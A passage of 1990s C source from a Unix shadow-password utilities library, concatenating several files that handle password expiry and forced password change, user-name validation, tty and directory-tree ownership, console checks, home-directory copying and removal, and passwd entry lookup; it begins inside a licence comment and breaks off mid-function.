 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include <sys/types.h>
#include <stdio.h>
#ifndef BSD
#include <sys/wait.h>
#endif
#include "prototypes.h"
#include "defines.h"
#include <pwd.h>
#include <grp.h>
#ifdef HAVE_USERSEC_H
#include <userpw.h>
#include <usersec.h>
#include <userconf.h>
#endif

#ifndef	AGING
#if defined(SHADOWPWD) || defined(HAVE_USERSEC_H)
#define AGING	1
#endif
#else
#if !defined(SHADOWPWD) && !defined(HAVE_USERSEC_H) && !defined(ATT_AGE)
#undef AGING
#endif
#endif

#if defined(SHADOWPWD) || defined(AGING) /*{*/

#include "rcsid.h"
RCSID("$Id: age.c,v 1.2 1996/09/10 02:45:12 marekm Exp $")

#define EXPIRE_TODAY		"Your password will expire today.\n"
#define EXPIRE_DAY		"Your password will expire tomorrow.\n"
#define EXPIRE_DAYS		"Your password will expire in %ld days.\n"
#define PASSWORD_EXPIRED	"Your password has expired."
#define PASSWORD_INACTIVE	"Your password is inactive."
#define LOGIN_EXPIRED		"Your login has expired."
#define CONTACT_SYSADM		"  Contact the system administrator.\n"
#define NEW_PASSWORD		"  Choose a new password.\n"

#ifndef PASSWD_PROGRAM
#define PASSWD_PROGRAM "/bin/passwd"
#endif

extern	time_t	time ();

/*
 * expire - force password change if password expired
 *
 *	expire() calls /bin/passwd to change the user's password
 *	if it has expired.
 */

#ifdef	SHADOWPWD
int
expire (pw, sp)
	const struct passwd *pw;
	const struct spwd *sp;
#else
int
expire (pw)
	const struct passwd *pw;
#endif
{
	int	status;
	int	child;
	int	pid;

#ifdef	SHADOWPWD
	if (! sp)
		sp = pwd_to_spwd (pw);
#endif

	/*
	 * See if the user's password has expired, and if so
	 * force them to change their password.
	 */

#ifdef	SHADOWPWD
	switch (status = isexpired (pw, sp))
#else
	switch (status = isexpired (pw))
#endif
	{
		case 0:
			return 0;
		case 1:
			printf (PASSWORD_EXPIRED);
			break;
		case 2:
			printf (PASSWORD_INACTIVE);
			break;
		case 3:
			printf (LOGIN_EXPIRED);
			break;
	}

	/*
	 * Setting the maximum valid period to less than the minimum
	 * valid period means that the minimum period will never
	 * occur while the password is valid, so the user can never
	 * change that password.
	 */

#ifdef	SHADOWPWD
	if (status > 1 || sp->sp_max < sp->sp_min)
#else
	if (status > 1 || c64i (pw->pw_age[0]) < c64i (pw->pw_age[1]))
#endif
	{
		puts (CONTACT_SYSADM);
		exit (1);
	}
	puts (NEW_PASSWORD);
	fflush (stdout);

	/*
	 * Close all the files so that unauthorized access won't
	 * occur.  This needs to be done anyway because those files
	 * might become stale after "passwd" is executed.
	 */

#ifdef	SHADOWPWD
	endspent ();
#endif
	endpwent ();
#ifdef	SHADOWGRP
	endsgent ();
#endif
	endgrent ();

	/*
	 * Execute the /bin/passwd command.  The exit status will be
	 * examined to see what the result is.  If there are any
	 * errors the routine will exit.  This forces the user to
	 * change their password before being able to use the account.
	 */

	if ((pid = fork ()) == 0) {
		/*
		 * Set the UID to be that of the user.  This causes
		 * passwd to work just like it would had they executed
		 * it from the command line while logged in.
		 */

		if (setup_uid_gid(pw, 0))
			_exit(127);

		execl (PASSWD_PROGRAM, PASSWD_PROGRAM, pw->pw_name, (char *)0);
		puts ("Can't execute " PASSWD_PROGRAM);
		fflush (stdout);
		_exit(126);
	} else if (pid == -1) {
		perror("fork");
		exit(1);
	}
	while ((child = wait (&status)) != pid && child != -1)
		;

	if (child == pid && status == 0)
		return 1;

	exit (1);
	/*NOTREACHED*/
}

/*
 * agecheck - see if warning is needed for password expiration
 *
 *	agecheck sees how many days until the user's password is going
 *	to expire and warns the user of the pending password expiration.
 */

#ifdef	SHADOWPWD
void
agecheck (pw, sp)
	const struct passwd *pw;
	const struct spwd *sp;
#else
void
agecheck (pw)
	const struct passwd *pw;
#endif
{
	long	clock = time ((long *) 0) / SCALE;
	long	remain;

#ifdef	SHADOWPWD
	if (! sp)
		sp = pwd_to_spwd (pw);

	/*
	 * The last, max, and warn fields must be supported or the
	 * warning period cannot be calculated.
	 */

	if (sp->sp_lstchg == -1 || sp->sp_max == -1 || sp->sp_warn == -1)
		return;
#else
	if (pw->pw_age[0] == '\0')
		return;
#endif

#ifdef	SHADOWPWD
	if ((remain = (sp->sp_lstchg + sp->sp_max) - clock) <= sp->sp_warn)
#else
	if ((remain = (a64l (pw->pw_age + 2) + c64i (pw->pw_age[0])) * 7
			- clock) <= getdef_num ("PASS_WARN_AGE", 7))
#endif
	{
		remain /= DAY/SCALE;
		if (remain > 1)
			printf(EXPIRE_DAYS, remain);
		else if (remain == 1)
			printf(EXPIRE_DAY);
		else if (remain == 0)
			printf(EXPIRE_TODAY);
	}
}
#endif /*}*/
/*
 * basename.c - not worth copyrighting :-).  Some versions of Linux libc
 * already have basename(), other versions don't.  To avoid confusion,
 * we will not use the function from libc and use a different name here.
 * --marekm
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: basename.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

#include "defines.h"

char *
Basename(str)
	char *str;
{
	char *cp = strrchr(str, '/');

	return cp ? cp+1 : str;
}
/*
 * check_name() - check the new user/group name for validity
 * return value: 1 - OK, 0 - bad name
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: chkname.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

#include <ctype.h>
#include "defines.h"

int
check_name(name)
	const char *name;
{
	/*
	 * Check for validity.  The name must be at least 1 character in
	 * length, but not more than 8.  It must start with a letter and
	 * contain printable characters, not including ':' and '\n'.
	 */

	if (strlen (name) > 8)
		return 0;

	if (! *name || ! isalpha(*name))
		return 0;

	while (*name) {
		if (*name == ':' || *name == '\n' ||
		    ! isprint(*name))
			return 0;

		name++;
	}

	return 1;
}
/*
 * Copyright 1992, 1993, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: chowndir.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

#include <sys/types.h>
#include <sys/stat.h>
#include "defines.h"

#include <fcntl.h>
#include <stdio.h>

#ifndef	S_ISDIR
#define	S_ISDIR(x)	(((x)&S_IFMT)==S_IFDIR)
#endif
#ifndef	S_ISREG
#define	S_ISREG(x)	(((x)&S_IFMT)==S_IFREG)
#endif

/*
 * chown_tree - change ownership of files in a directory tree
 *
 *	chown_dir() walks a directory tree and changes the ownership
 *	of all files owned by the provided user ID.
 */

int
chown_tree(root, old_uid, new_uid, old_gid, new_gid)
	const char *root;
	uid_t old_uid, new_uid;
	gid_t old_gid, new_gid;
{
	char	new_name[BUFSIZ];
	int	rc = 0;
	struct	DIRECT	*ent;
	struct	stat	sb;
	DIR	*dir;

	/*
	 * Make certain the directory exists.  This routine is called
	 * directory by the invoker, or recursively.
	 */

	if (access (root, 0) != 0)
		return -1;

	/*
	 * Open the directory and read each entry.  Every entry is tested
	 * to see if it is a directory, and if so this routine is called
	 * recursively.  If not, it is checked to see if it is owned by
	 * old user ID.
	 */

	if (! (dir = opendir (root)))
		return -1;

	while ((ent = readdir (dir))) {

		/*
		 * Skip the "." and ".." entries
		 */

		if (strcmp (ent->d_name, ".") == 0 ||
				strcmp (ent->d_name, "..") == 0)
			continue;

		/*
		 * Make the filename for both the source and the
		 * destination files.
		 */

		if (strlen (root) + strlen (ent->d_name) + 2 > BUFSIZ)
			break;

		sprintf (new_name, "%s/%s", root, ent->d_name);

		if (stat (new_name, &sb) == -1)
			continue;

		if (S_ISDIR (sb.st_mode)) {

			/*
			 * Do the entire subdirectory.
			 */

			if ((rc = chown_tree (new_name, old_uid, new_uid,
					      old_gid, new_gid)))
				break;
		}
		if (sb.st_uid == old_uid)
			chown (new_name, new_uid,
				sb.st_gid == old_gid ? new_gid:sb.st_gid);
	}
	closedir (dir);

	/*
	 * Now do the root of the tree
	 */

	if (! stat (root, &sb)) {
		if (sb.st_uid == old_uid)
			chown (root, new_uid,
				sb.st_gid == old_gid ? new_gid:sb.st_gid);
	}
	return rc;
}
/*
 * Copyright 1989 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: chowntty.c,v 1.2 1996/09/20 09:08:01 marekm Exp $")

#include <sys/types.h>
#include <sys/stat.h>

#include <stdio.h>
#include <grp.h>

#include "prototypes.h"
#include "defines.h"
#include <pwd.h>
#include "getdef.h"

/*
 * is_my_tty -- determine if "tty" is the same as TTY stdin is using
 */

static int
is_my_tty(tty)
	const char *tty;
{
	struct	stat	by_name, by_fd;

	if (stat (tty, &by_name) || fstat (0, &by_fd))
		return 0;

	if (by_name.st_rdev != by_fd.st_rdev)
		return 0;
	else
		return 1;
}

/*
 *	chown_tty() sets the login tty to be owned by the new user ID
 *	with TTYPERM modes
 */

void
chown_tty(tty, info)
	const char *tty;
	const struct passwd *info;
{
	extern	int	errno;
	char	buf[BUFSIZ];
	char	*group;		/* TTY group name or number */
	struct	group	*grent;
	int	i;

	/*
	 * See if login.defs has some value configured for the port group
	 * ID.  Otherwise, use the user's primary group ID.
	 */

	if (! (group = getdef_str ("TTYGROUP")))
		i = info->pw_gid;
	else if (group[0] >= '0' && group[0] <= '9')
		i = atoi (group);
	else if ((grent = getgrnam (group)))
		i = grent->gr_gid;
	else
		i = info->pw_gid;

	/*
	 * Change the permissions on the TTY to be owned by the user with
	 * the group as determined above.
	 */

	if (*tty != '/') {
		char *full_tty = xmalloc(strlen(tty) + 6);
		sprintf(full_tty, "/dev/%s", tty);
		tty = full_tty;
	}

	if (! is_my_tty (tty)) {
		SYSLOG((LOG_WARN, "unable to determine TTY name, got %s\n",
			tty));
		closelog();
		exit (1);
	}
	
	if (chown (tty, info->pw_uid, i) ||
			chmod (tty, getdef_num("TTYPERM", 0600))) {
		(void) sprintf (buf, "Unable to change tty %s", tty);
		SYSLOG((LOG_WARN, "unable to change tty `%s' for user `%s'\n",
			tty, info->pw_name));
		closelog();
		perror (buf);
		exit (errno);
	}
}
/*
 * Copyright 1991, John F. Haugh II and Chip Rosenthal
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>
#include "defines.h"
#include <stdio.h>
#include "getdef.h"

#include "rcsid.h"
RCSID("$Id: console.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

/*
 * tty - return 1 if the "tty" is a console device, else 0.
 *
 * Note - we need to take extreme care here to avoid locking out root logins
 * if something goes awry.  That's why we do things like call everything a
 * console if the consoles file can't be opened.  Because of this, we must
 * warn the user to protect against the remove of the consoles file since
 * that would allow an unauthorized root login.
 */

int
console (tty)
	const char *tty;
{
	FILE	*fp;
	char	buf[BUFSIZ], *cons, *s;

	/*
	 * If the CONSOLE configuration definition isn't given, call
	 * everything a valid console.
	 */

	if ((cons = getdef_str("CONSOLE")) == NULL)
		return 1;

	/*
	 * If this isn't a filename, then it is a ":" delimited list of
	 * console devices upon which root logins are allowed.
	 */

	if (*cons != '/') {
		cons = strcpy(buf, cons);
		while ((s = strtok(cons, ":")) != NULL) {
			if (strcmp(s, tty) == 0)
				return 1;

			cons = NULL;
		}
		return 0;
	}

	/*
	 * If we can't open the console list, then call everything a
	 * console - otherwise root will never be allowed to login.
	 */

	if ((fp = fopen(cons, "r")) == NULL)
		return 1;

	/*
	 * See if this tty is listed in the console file.
	 */

	while (fgets(buf,sizeof(buf),fp) != NULL) {
		buf[strlen(buf)-1] = '\0';
		if (strcmp(buf,tty) == 0) {
			(void) fclose(fp);
			return 1;
		}
	}

	/*
	 * This tty isn't a console.
	 */

	(void) fclose(fp);
	return 0;
}
/*
 * Copyright 1991 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: copydir.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")


#include <sys/stat.h>

#include <sys/types.h>
#include <fcntl.h>
#include <stdio.h>

#include "prototypes.h"
#include "defines.h"

#ifndef	S_ISDIR
#define	S_ISDIR(x)	(((x)&S_IFMT)==S_IFDIR)
#endif
#ifndef	S_ISREG
#define	S_ISREG(x)	(((x)&S_IFMT)==S_IFREG)
#endif
#ifndef	S_ISLNK
#define	S_ISLNK(x)	(((x)&S_IFMT)==S_IFLNK)
#endif

static const char *src_orig;
static const char *dst_orig;

struct	link_name {
	int	ln_dev;
	int	ln_ino;
	int	ln_count;
	char	*ln_name;
	struct	link_name *ln_next;
};
static	struct	link_name *links;

/*
 * remove_link - delete a link from the link list
 */

static void
remove_link (ln)
	struct link_name *ln;
{
	struct link_name *lp;

	if (links == ln) {
		links = ln->ln_next;
		free (ln->ln_name);
		free (ln);
		return;
	}
	for (lp = links;lp;lp = lp->ln_next)
		if (lp->ln_next == ln)
			break;

	if (! lp)
		return;

	lp->ln_next = lp->ln_next->ln_next;
	free (ln->ln_name);
	free (ln);
}

/*
 * check_link - see if a file is really a link
 */

static struct link_name *
check_link (name, sb)
	const char *name;
	const struct stat *sb;
{
	struct	link_name *lp;
	int	src_len;
	int	dst_len;
	int	name_len;

	for (lp = links;lp;lp = lp->ln_next)
		if (lp->ln_dev == sb->st_dev && lp->ln_ino == sb->st_ino)
			return lp;

	if (sb->st_nlink == 1)
		return 0;

	lp = (struct link_name *) xmalloc (sizeof *lp);
	src_len = strlen (src_orig);
	dst_len = strlen (dst_orig);
	name_len = strlen (name);
	lp->ln_dev = sb->st_dev;
	lp->ln_ino = sb->st_ino;
	lp->ln_count = sb->st_nlink;
	lp->ln_name = xmalloc (name_len - src_len + dst_len + 1);
	sprintf (lp->ln_name, "%s%s", dst_orig, name + src_len);
	lp->ln_next = links;
	links = lp;

	return 0;
}

/*
 * copy_tree - copy files in a directory tree
 *
 *	copy_tree() walks a directory tree and copies ordinary files
 *	as it goes.
 */

int
copy_tree (src_root, dst_root, uid, gid)
	const char *src_root;
	const char *dst_root;
	uid_t uid;
	gid_t gid;
{
	char	src_name[BUFSIZ];
	char	dst_name[BUFSIZ];
	char	buf[BUFSIZ];
	int	ifd;
	int	ofd;
	int	err = 0;
	int	cnt;
	int	set_orig = 0;
	struct	DIRECT	*ent;
	struct	stat	sb;
	struct	link_name *lp;
	DIR	*dir;

	/*
	 * Make certain both directories exist.  This routine is called
	 * after the home directory is created, or recursively after the
	 * target is created.  It assumes the target directory exists.
	 */

	if (access (src_root, 0) != 0 || access (dst_root, 0) != 0)
		return -1;

	/*
	 * Open the source directory and read each entry.  Every file
	 * entry in the directory is copied with the UID and GID set
	 * to the provided values.  As an added security feature only
	 * regular files (and directories ...) are copied, and no file
	 * is made set-ID.
	 */

	if (! (dir = opendir (src_root)))
		return -1;

	if (src_orig == 0) {
		src_orig = src_root;
		dst_orig = dst_root;
		set_orig++;
	}
	while ((ent = readdir (dir))) {

		/*
		 * Skip the "." and ".." entries
		 */

		if (strcmp (ent->d_name, ".") == 0 ||
				strcmp (ent->d_name, "..") == 0)
			continue;

		/*
		 * Make the filename for both the source and the
		 * destination files.
		 */

		if (strlen (src_root) + strlen (ent->d_name) + 2 > BUFSIZ) {
			err++;
			break;
		}
		sprintf (src_name, "%s/%s", src_root, ent->d_name);

		if (strlen (dst_root) + strlen (ent->d_name) + 2 > BUFSIZ) {
			err++;
			break;
		}
		sprintf (dst_name, "%s/%s", dst_root, ent->d_name);

#ifdef	S_IFLNK
		if (lstat (src_name, &sb) == -1)
#else
		if (stat (src_name, &sb) == -1)
#endif
			continue;

		if (S_ISDIR (sb.st_mode)) {

			/*
			 * Create a new target directory, make it owned by
			 * the user and then recursively copy that directory.
			 */

			mkdir (dst_name, sb.st_mode & 0777);
			chown (dst_name, uid == (uid_t) -1 ? sb.st_uid:uid,
				gid == (gid_t) -1 ? sb.st_gid:gid);

			if (copy_tree (src_name, dst_name, uid, gid)) {
				err++;
				break;
			}
			continue;
		}
#ifdef	S_IFLNK
		/*
		 * Copy any symbolic links
		 */

		if (S_ISLNK (sb.st_mode)) {
			char	oldlink[BUFSIZ];
			char	dummy[BUFSIZ];
			int	len;

			/*
			 * Get the name of the file which the link points
			 * to.  If that name begins with the original
			 * source directory name, that part of the link
			 * name will be replaced with the original
			 * destinateion directory name.
			 */

			if ((len = readlink (src_name, oldlink, BUFSIZ)) < 0) {
				err++;
				break;
			}
			if (! strncmp (oldlink, src_orig, strlen (src_orig))) {
				strcpy (dummy, dst_orig);
				strcat (dummy, oldlink + strlen (src_orig));
				strcpy (oldlink, dummy);
			}
			if (symlink (oldlink, dst_name)) {
				err++;
				break;
			}
			continue;
		}
#endif

		/*
		 * See if this is a previously copied link
		 */

		if ((lp = check_link (src_name, &sb))) {
			if (link (lp->ln_name, dst_name)) {
				err++;
				break;
			}
			if (unlink (src_name)) {
				err++;
				break;
			}
			if (--lp->ln_count <= 0)
				remove_link (lp);

			continue;
		}

		/*
		 * Deal with FIFOs and special files.  The user really
		 * shouldn't have any of these, but it seems like it
		 * would be nice to copy everything ...
		 */

		if (! S_ISREG (sb.st_mode)) {
			if (mknod (dst_name, sb.st_mode & ~07777, sb.st_rdev) ||
				chown (dst_name, uid == (uid_t) -1 ? sb.st_uid:uid,
					gid == (gid_t) -1 ? sb.st_gid:gid) ||
					chmod (dst_name, sb.st_mode & 07777)) {
				err++;
				break;
			}
			continue;
		}

		/*
		 * Create the new file and copy the contents.  The new
		 * file will be owned by the provided UID and GID values.
		 */

		if ((ifd = open (src_name, O_RDONLY)) < 0) {
			err++;
			break;
		}
		if ((ofd = open (dst_name, O_WRONLY|O_CREAT, 0)) < 0 ||
			chown (dst_name, uid == (uid_t) -1 ? sb.st_uid:uid,
					gid == (gid_t) -1 ? sb.st_gid:gid) ||
				chmod (dst_name, sb.st_mode & 07777)) {
			close (ifd);
			err++;
			break;
		}
		while ((cnt = read (ifd, buf, sizeof buf)) > 0) {
			if (write (ofd, buf, cnt) != cnt) {
				cnt = -1;
				break;
			}
		}
		close (ifd);
		close (ofd);

		if (cnt == -1) {
			err++;
			break;
		}
	}
	closedir (dir);

	if (set_orig) {
		src_orig = 0;
		dst_orig = 0;
	}
	return err ? -1:0;
}

/*
 * remove_tree - remove files in a directory tree
 *
 *	remove_tree() walks a directory tree and deletes all the files
 *	and directories.
 */

int
remove_tree (root)
	const char *root;
{
	char	new_name[BUFSIZ];
	int	err = 0;
	struct	DIRECT	*ent;
	struct	stat	sb;
	DIR	*dir;

	/*
	 * Make certain the directory exists.
	 */

	if (access (root, 0) != 0)
		return -1;

	/*
	 * Open the source directory and read each entry.  Every file
	 * entry in the directory is copied with the UID and GID set
	 * to the provided values.  As an added security feature only
	 * regular files (and directories ...) are copied, and no file
	 * is made set-ID.
	 */

	dir = opendir (root);

	while ((ent = readdir (dir))) {

		/*
		 * Skip the "." and ".." entries
		 */

		if (strcmp (ent->d_name, ".") == 0 ||
				strcmp (ent->d_name, "..") == 0)
			continue;

		/*
		 * Make the filename for the current entry.
		 */

		if (strlen (root) + strlen (ent->d_name) + 2 > BUFSIZ) {
			err++;
			break;
		}
		sprintf (new_name, "%s/%s", root, ent->d_name);
#ifdef	S_IFLNK
		if (lstat (new_name, &sb) == -1)
#else
		if (stat (new_name, &sb) == -1)
#endif
			continue;

		if (S_ISDIR (sb.st_mode)) {

			/*
			 * Recursively delete this directory.
			 */

			if (remove_tree (new_name)) {
				err++;
				break;
			}
			if (rmdir (new_name)) {
				err++;
				break;
			}
			continue;
		}
		unlink (new_name);
	}
	closedir (dir);

	return err ? -1:0;
}
/*
 * Copyright 1989 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: entry.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

#include <sys/types.h>
#include <stdio.h>
#include "prototypes.h"
#include "defines.h"
#include <pwd.h>

struct	passwd	*fgetpwent ();
char	*xmalloc ();

void
entry(name, pwent)
	const char *name;
	struct passwd *pwent;
{
	struct	passwd	*passwd;
#ifdef	SHADOWPWD
	struct	spwd	*spwd;
#ifdef	ATT_AGE
	char	*l64a ();
	char	*cp;
#endif
#endif

	if (! (passwd = getpwnam (name))) {
		pwent->pw_name = (char *) 0;
		return;
	} else  {
		pwent->pw_name = xstrdup (passwd->pw_name);
		pwent->pw_uid = passwd->pw_uid;
		pwent->pw_gid = passwd->pw_gid;
#ifdef	ATT_COMMENT
		pwent->pw_comment = xstrdup (passwd->pw_comment);
#endif
		pwent->pw_gecos = xstrdup (passwd->pw_gecos);
		pwent->pw_dir = xstrdup (passwd->pw_dir);
		pwent->pw_shell = xstrdup (passwd->pw_shell);
#if defined(SHADOWPWD) && !defined(AUTOSHADOW)
		setspent ();
		if ((spwd = getspnam (name))) {
			pwent->pw_passwd = xstrdup (spwd->sp_pwdp);
#ifdef	ATT_AGE
			pwent->pw_age = (char *) xmalloc (5);

			if (spwd->sp_max > (63*7))
				spwd->sp_max = (63*7);
			if (spwd->sp_min > (63*7))
				spwd->sp_min = (63*7);

			pwent->pw_age[0] = i64c (spwd->sp_max / 7);
